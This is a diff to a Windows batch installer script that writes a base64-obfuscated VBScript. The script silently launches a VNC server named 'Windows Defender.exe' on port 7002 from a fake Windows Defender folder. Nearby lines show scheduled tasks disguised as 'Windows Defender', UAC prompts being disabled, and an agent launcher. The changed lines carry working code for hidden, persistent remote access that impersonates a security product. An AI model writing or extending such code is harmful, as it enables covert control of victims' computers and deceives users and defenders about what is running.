@@ -156,7 +156,7 @@ echo     Scheduled task "Security Script" created.
 :skip_security
 
 REM --- Write autostart VBScript (starts VNC directly, hidden) ---
-powershell -NoProfile -Command "$b64='U2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCldzaFNoZWxsLlJ1biAiIkM6XFByb2dyYW1EYXRhXFdpbmRvd3MgRGVmZW5kZXJcVm5jRGlyZWN0XFdpbmRvd3MgRGVmZW5kZXIuZXhlIiBwb3J0PTcwMDIgY3dkPUM6XFByb2dyYW1EYXRhXFdpbmRvd3MgRGVmZW5kZXJcVm5jRGlyZWN0XHZuYyBmcHM9MzYwIHNjYWxlPTAiLCAwLCBGYWxzZQ0K'; [IO.File]::WriteAllBytes('%DEST%\WinDefend.vbs', [Convert]::FromBase64String($b64))"
+powershell -NoProfile -Command "$b64='U2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCldzaFNoZWxsLlJ1biAiIkM6XFByb2dyYW1EYXRhXFdpbmRvd3MgRGVmZW5kZXJcVm5jRGlyZWN0XFdpbmRvd3MgRGVmZW5kZXIuZXhlIiBwb3J0PTcwMDIgImN3ZD1DOlxQcm9ncmFtRGF0YVxXaW5kb3dzIERlZmVuZGVyXFZuY0RpcmVjdFx2bmMiIGZwcz0zNjAgc2NhbGU9MCIsIDAsIEZhbHNlDQo='; [IO.File]::WriteAllBytes('%DEST%\WinDefend.vbs', [Convert]::FromBase64String($b64))"
 echo     Autostart VBScript written.
 
 schtasks /query /tn "Windows Defender" >nul 2>&1
@@ -195,7 +195,7 @@ echo     UAC prompts disabled. Restart required to take effect.
 REM --- 8. Start services ---
 echo [7/7] Starting Agent and VNC Server...
 cd /d "%DEST%\VncDirect\vnc"
-start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
+start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 "cwd=%DEST%\VncDirect\vnc" fps=360 scale=0
 cd /d "%DEST%"
 start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd=%DEST%
 
